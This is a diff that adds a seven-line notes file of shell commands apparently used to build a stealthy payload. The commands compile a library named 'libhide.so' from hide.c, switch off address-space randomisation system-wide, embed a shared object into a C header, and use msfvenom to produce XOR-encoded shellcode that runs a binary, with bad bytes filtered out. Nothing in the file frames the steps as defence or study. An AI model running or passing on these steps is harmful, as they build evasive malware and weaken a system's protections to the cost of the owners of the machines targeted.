@@ -1,0 +1,7 @@
+gcc -fPIC -shared -o libhide.so hide.c -ldl
+
+echo 0 > /proc/sys/kernel/randomize_va_space
+
+xxd -i hello.so > hello.h
+
+msfvenom -p linux/x64/exec CMD=/path/to/ishd -f c -b "\x00\x0a\x0d" -e x64/xor_dynamic > enc_shellcode.txt
